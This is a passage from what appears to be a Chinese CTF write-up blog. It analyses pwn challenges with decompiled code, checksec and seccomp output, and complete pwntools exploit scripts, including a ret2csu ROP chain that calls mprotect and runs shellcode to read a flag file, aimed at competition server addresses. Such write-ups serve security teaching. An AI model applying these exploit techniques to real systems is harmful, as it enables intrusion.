<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;glod :%d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v26);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, key) &amp;&amp; v26 &gt; <span class="number">10000000</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::ifstream::basic_ifstream(v30);</span><br><span class="line">  <span class="built_in">std</span>::ifstream::open(v30, <span class="string">&quot;./flag&quot;</span>, <span class="number">8LL</span>);</span><br><span class="line">  v18 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Reading from the file&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v30, v36);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;flag:%s&quot;</span>, v36);</span><br><span class="line">  v19 = <span class="built_in">strlen</span>(v36);</span><br><span class="line">  send(v24, v36, v19, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">std</span>::ifstream::~ifstream(v30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>因此我们作出如下修改：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span> *)s[<span class="number">100</span> * v0 - <span class="number">100</span> + v1] == <span class="string">&quot;$&quot;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    glod += <span class="number">10000001</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;你给了出题人或者赛事负责人一拳&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你现在拥有%d个猫币&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)glod);</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">char</span> *)s[<span class="number">100</span> * v0 - <span class="number">100</span> + v1] == <span class="string">&quot;@&quot;</span> &amp;&amp; glod &gt; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GET_FLAG!&quot;</span>);</span><br><span class="line">  nc = get_nc();</span><br><span class="line">  get_flag(nc);</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./client&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x92D3)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendline(op)</span><br><span class="line">    </span><br><span class="line">p.sendline(<span class="string">&quot;223.112.5.156&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;62238&quot;</span>)</span><br><span class="line"><span class="comment">#p.sendline(&quot;127.0.0.1&quot;)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;8888&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    cmd(<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    cmd(<span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;j&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    cmd(<span class="string">&quot;s&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    cmd(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    cmd(<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    cmd(<span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;j&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bitcoin"><a href="#bitcoin" class="headerlink" title="bitcoin"></a>bitcoin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">2604789b</span>b1491ea07bfd32d3b87759c191b91f30, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，Partial RELRO</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bitcoin seccomp-tools dump ./pwn       </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>ban 了 <code>execve</code> 和 <code>mmap</code></li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Password: &quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, passwd);</span><br></pre></td></tr></table></figure>
<ul>
<li>栈溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>有栈溢出，可以写 ROP 链</p>
<p>打比赛时的入侵思路就是：</p>
<ul>
<li>执行 <code>fopen</code> 打开 <code>flag</code> 文件</li>
<li>执行 <code>fgets</code> 把 <code>flag</code> 文件的内容读到本地</li>
<li>执行 <code>printf</code> 把 <code>flag</code> 输出到屏幕</li>
</ul>
<p>需要解决的第一个问题就是把 <code>fopen</code> 的返回值与 <code>fgets</code> 相关联：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0x24cbeb0</span> ◂— <span class="number">0xfbad2488</span></span><br><span class="line">RBX  <span class="number">0x4062a0</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line">RCX  <span class="number">0x6</span></span><br><span class="line">RDX  <span class="number">0x0</span></span><br><span class="line">RDI  <span class="number">0x406360</span> ◂— outsb  dx, byte ptr [rsi] <span class="comment">/* &#x27;ned!&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实就是把 RAX 存储到 RDX 中</li>
</ul>
<p>最后找不到这个 gadget，只好放弃了</p>
<p>组里的大佬用 <code>mprotect</code> 来执行 <code>shellcode</code>，当时没有想到这个方法（没有 <code>read</code> 函数可以用 <code>cin</code> 代替）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x40223B\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x269F)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendline(op)</span><br><span class="line">    </span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000406303</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x0000000000406301</span></span><br><span class="line">cin = <span class="number">0x6093A0</span></span><br><span class="line">use_cin = <span class="number">0x401C30</span></span><br><span class="line">hard = <span class="number">0x609248</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">start = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x4062E0</span></span><br><span class="line">csu_end_addr=<span class="number">0x4062FA</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x609300</span> </span><br><span class="line">got_addr = <span class="number">0x609000</span></span><br><span class="line"></span><br><span class="line">flag_str = <span class="number">0x406626</span> </span><br><span class="line">modes_str = <span class="number">0x406365</span></span><br><span class="line"></span><br><span class="line">fget_got = <span class="number">0x6091D8</span></span><br><span class="line">fopen_plt = <span class="number">0x401E60</span> </span><br><span class="line">mprotect_got = <span class="number">0x6091E0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdi=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdi, rsi, rdx, last)</span></span><br><span class="line">    payload =  <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">mprotect = csu(<span class="number">0</span>,<span class="number">1</span>,mprotect_got,got_addr,<span class="number">0x1000</span>,<span class="number">7</span>,pop_rdi_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">name = <span class="string">&quot;YHellow&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x48</span> </span><br><span class="line">payload += mprotect + p64(cin)</span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(use_cin) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Password:&quot;</span>,payload)</span><br><span class="line">p.sendline(asm(shellcraft.cat(<span class="string">&quot;./flag&quot;</span>)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="vmbyhrp"><a href="#vmbyhrp" class="headerlink" title="vmbyhrp"></a>vmbyhrp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HRPVM: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=ae19ec35e351cd7e0113b04270566c04bd3bd321, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)name, <span class="string">&quot;ab+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( stream )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_fscanf((__int64)stream, <span class="string">&quot;%c&quot;</span>, &amp;input[i]) != <span class="number">-1</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  file_data[file_count].fd = global_fd;</span><br><span class="line">  file_data[file_count].name = (<span class="keyword">char</span> *)name;</span><br><span class="line">  file_data[file_count].use = <span class="number">1000LL</span>;</span><br><span class="line">  index = file_count;</span><br><span class="line">  file_data[index].data = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>(file_data[file_count].data, input, <span class="number">0x1000</span>uLL);</span><br><span class="line">  ++file_count;</span><br><span class="line">  ++global_fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序已经开好了后门</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>想要执行后门函数，就必须执行 <code>DEBUG</code> 函数，从而需要让 <code>users[0]</code> 和 <code>users[1]</code> 都为“0”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(*(&amp;system_cmd + <span class="number">6</span>), (<span class="keyword">const</span> <span class="keyword">char</span> *)buf, len) &amp;&amp; !users[<span class="number">1</span>] &amp;&amp; !users[<span class="number">0</span>] )<span class="comment">// debug</span></span><br><span class="line">  DEBUG();</span><br></pre></td></tr></table></figure>
<p>程序没法直接修改 <code>users[0]</code> 和 <code>users[1]</code>，但可以通过 <code>file_data</code> 向下覆盖：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000204120</span> file_data Chunk <span class="number">20</span><span class="function">h <span class="title">dup</span><span class="params">(&lt;?&gt;)</span>         </span></span><br><span class="line"><span class="function">    ......</span></span><br><span class="line"><span class="function">.bss:0000000000204520 users dd 2 <span class="title">dup</span><span class="params">(?)</span>                          </span></span><br></pre></td></tr></table></figure>
<p>然后通过 <code>vm_elf</code> 把 <code>users[0]</code> 和 <code>users[1]</code> 设置为“0”</p>
<p>进入 <code>DEBUG</code> 函数，把 flag 写到本地以后还有一些小问题：</p>
<ul>
<li>需要先执行 <code>mmap</code> 申请一片空间</li>
<li>接着执行 <code>reboot</code> 写入这片空间的地址</li>
</ul>
<p>这样就可以避免在打印 flag 时发生段错误了</p>
<p>完整 exp：</p>
